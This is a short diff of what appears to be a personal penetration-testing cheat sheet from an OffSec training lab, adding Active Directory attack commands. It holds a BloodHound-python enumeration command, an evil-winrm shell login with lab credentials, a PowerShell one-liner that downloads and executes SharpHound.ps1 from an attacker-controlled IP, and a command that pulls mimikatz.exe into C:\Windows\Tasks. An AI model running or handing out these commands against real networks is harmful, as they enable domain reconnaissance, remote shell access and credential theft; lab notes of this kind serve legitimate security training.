@@ -1,4 +1,11 @@
-
+BloodHoubnd Python
 # bloodhound-python -u offsec -p lab -ns 192.168.215.75 -d prod.corp.com -c All
 
+Shell access:
 # evil-winrm -i  192.168.215.75 -u offsec -p lab
+
+Donwload File from Linux:
+# iex(new-object net.webclient).downloadstring('http://192.168.45.156/SharpHound.ps1')
+
+Copy File:
+# (New-Object System.Net.WebClient).DownloadFile("http://192.168.45.156/mimikatz.exe", "C:\Windows\Tasks\mimikatz.exe")
